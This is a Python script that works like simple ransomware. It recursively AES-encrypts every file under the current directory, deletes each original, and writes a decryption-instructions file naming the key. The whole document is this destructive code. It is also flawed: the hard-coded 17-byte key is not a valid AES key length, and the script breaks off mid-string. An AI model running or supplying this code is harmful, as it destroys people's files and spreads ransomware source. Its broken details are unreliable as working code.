import base64
import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Set the decryption key for AES
decryption_key = b"my_decryption_key"

# Function to encrypt a file using AES
def encrypt_file(file_path, key):
    # Generate a random initialization vector (IV)
    iv = os.urandom(16)

    # Read the contents of the file
    with open(file_path, "rb") as file:
        file_contents = file.read()

    # Pad the file contents to a multiple of 16 bytes
    padded_contents = pad(file_contents, AES.block_size)

    # Create a new AES cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Encrypt the padded contents
    encrypted_contents = cipher.encrypt(padded_contents)

    # Encode the IV and encrypted contents as base64
    encoded_iv = base64.b64encode(iv).decode()
    encoded_encrypted_contents = base64.b64encode(encrypted_contents).decode()

    # Return the IV and encrypted contents as a tuple
    return (encoded_iv, encoded_encrypted_contents)

# Function to decrypt a file using AES
def decrypt_file(iv, encrypted_contents, key):
    # Decode the IV and encrypted contents from base64
    decoded_iv = base64.b64decode(iv)
    decoded_encrypted_contents = base64.b64decode(encrypted_contents)

    # Create a new AES cipher
    cipher = AES.new(key, AES.MODE_CBC, decoded_iv)

    # Decrypt the encrypted contents
    padded_contents = cipher.decrypt(decoded_encrypted_contents)

    # Unpad the contents
    file_contents = unpad(padded_contents, AES.block_size)

    # Return the decrypted contents
    return file_contents

# Encrypt all the files in the current directory and subdirectories
for root, dirs, files in os.walk("."):
    for file in files:
        file_path = os.path.join(root, file)
        iv, encrypted_contents = encrypt_file(file_path, decryption_key)

        # Write the IV and encrypted contents to a new file
        encrypted_file_path = file_path + ".encrypted"
        with open(encrypted_file_path, "w") as encrypted_file:
            encrypted_file.write(iv + "\n")
            encrypted_file.write(encrypted_contents)

        # Delete the original file
        os.remove(file_path)

# Write the decryption instructions to a file
with open("decrypt_instructions.txt", "w") as instructions:
    instructions.write("To decrypt your files, follow these steps:\n")
    instructions.write("1. Enter the decryption key: " + decryption_key.decode() + "\n")
    instructions.write("2. Run the following command: python decrypt.py\
